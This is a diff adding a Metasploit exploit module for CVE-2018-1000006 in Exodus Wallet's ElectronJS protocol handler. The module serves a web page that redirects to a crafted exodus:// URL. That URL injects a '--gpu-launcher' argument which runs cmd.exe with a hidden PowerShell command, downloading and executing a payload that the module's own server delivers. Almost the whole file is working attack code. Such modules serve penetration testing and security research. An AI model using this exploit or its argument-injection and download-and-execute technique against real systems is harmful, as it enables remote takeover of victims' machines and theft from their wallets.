@@ -1,0 +1,104 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core/exploit/powershell'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ManualRanking
+
+  include Msf::Exploit::EXE
+  include Msf::Exploit::Powershell
+  include Msf::Exploit::Remote::HttpServer::HTML
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'         => 'Exodus Wallet (ElectronJS Framework) remote Code Execution',
+      'Description'  => %q(
+         This module exploits a Remote Code Execution vulnerability in Exodus Wallet,
+         a vulnerability in the ElectronJS Framework protocol handler can be used to
+         get arbitrary command execution if the user clicks on a specially crafted URL.
+      ),
+      'License'      => MSF_LICENSE,
+      'Author'       =>
+        [
+          'Wflki',          # Original exploit author
+          'Daniel Teixeira' # MSF module author
+        ],
+      'DefaultOptions' =>
+        {
+          'SRVPORT'    => '80',
+          'URIPATH'    => '/',
+        },
+      'References'     =>
+        [
+          [ 'EDB', '43899' ],
+          [ 'BID', '102796' ],
+          [ 'CVE', '2018-1000006' ],
+        ],
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          ['PSH (Binary)', {
+            'Platform' => 'win',
+            'Arch' => [ARCH_X86, ARCH_X64]
+          }]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Jan 25 2018'
+    ))
+
+  register_advanced_options(
+    [
+      OptBool.new('PSH-Proxy', [ true,  'PSH - Use the system proxy', true ]),
+    ], self.class
+  )
+  end
+
+  def gen_psh(url)
+      ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl
+
+      download_string = datastore['PSH-Proxy'] ? (Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)) : (Rex::Powershell::PshMethods.download_and_exec_string(url))
+
+      download_and_run = "#{ignore_cert}#{download_string}"
+
+      return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)
+  end
+
+  def serve_payload(cli)
+   data = cmd_psh_payload(payload.encoded,
+      payload_instance.arch.first,
+      remove_comspec: true,
+      exec_in_place: true
+    )
+
+    print_status("Delivering Payload")
+    send_response_html(cli, data, 'Content-Type' => 'application/octet-stream')
+  end
+
+  def serve_page(cli)
+    psh = gen_psh("#{get_uri}payload")
+    psh_escaped = psh.gsub("\\","\\\\\\\\").gsub("'","\\\\'")
+    val = rand_text_alpha(5)
+
+    html = %Q|<html>
+<!doctype html>
+<script>
+  window.location = 'exodus://#{val}" --gpu-launcher="cmd.exe /k #{psh_escaped}" --#{val}='
+</script>
+</html>
+|
+    send_response_html(cli, html)
+  end
+
+  def on_request_uri(cli, request)
+    case request.uri
+    when /payload$/
+      serve_payload(cli)
+    else
+      serve_page(cli)
+    end
+  end
+
+end
